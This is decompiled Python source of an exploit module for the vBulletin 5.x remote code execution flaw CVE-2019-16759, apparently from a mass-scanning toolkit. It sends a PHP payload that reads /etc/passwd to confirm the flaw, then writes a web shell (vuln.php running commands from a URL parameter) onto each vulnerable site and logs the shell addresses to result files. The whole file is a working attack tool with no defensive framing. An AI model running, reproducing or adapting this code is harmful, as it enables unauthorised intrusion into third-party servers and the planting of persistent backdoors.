# uncompyle6 version 2.11.5
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41) 
# [GCC 9.3.0]
# Embedded file name: Exploits\CVE_2019_16759vBulletinRCE.py
import requests
from Exploits import printModule
r = '\x1b[31m'
g = '\x1b[32m'
y = '\x1b[33m'
b = '\x1b[34m'
m = '\x1b[35m'
c = '\x1b[36m'
w = '\x1b[37m'
Headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}

def Exploit(site):
    payloadshell = '"Vuln!!<?php {});?>"'.format('system({}'.format('$_GET["cmd"]'))
    ShellPayload = "echo shell_exec('echo {} > vuln.php'); exit;".format(payloadshell)
    CheckVulnPayload = {'widgetConfig[code]': "echo shell_exec('cat /etc/passwd');exit;"}
    params = {'routestring': 'ajax/render/widget_php'}
    params['widgetConfig[code]'] = '{}'.format(CheckVulnPayload)
    try:
        resp = requests.post('http://' + site, data=params, timeout=10, headers=Headers)
        if 'root:x:' in str(resp.content):
            with open('result/vBulletinRCE_OK.txt', 'a') as writer:
                writer.write(site + ' --> CVE-2019-16759 Vulnerable' + '\n')
            try:
                params2 = {'routestring': 'ajax/render/widget_php'}
                params2['widgetConfig[code]'] = '{}'.format(ShellPayload)
                requests.post('http://' + site, data=params2, timeout=10, headers=Headers)
                Checkshell = requests.get('http://{}/vuln.php'.format(site), timeout=10, headers=Headers)
                if 'Vuln!!' in str(Checkshell.content):
                    with open('result/Shell_results.txt', 'a') as writer:
                        writer.write(site + '/vuln.php?cmd=id' + '\n')
                return printModule.returnYes(site, 'CVE-2019-16759', 'vBulletin RCE 5.x', 'vBulletin')
            except:
                return printModule.returnYes(site, 'CVE-2019-16759', 'vBulletin RCE 5.x', 'vBulletin')

        else:
            return printModule.returnNo(site, 'CVE-2019-16759', 'vBulletin RCE 5.x', 'vBulletin')
    except:
        return printModule.returnNo(site, 'CVE-2019-16759', 'vBulletin RCE 5.x', 'vBulletin')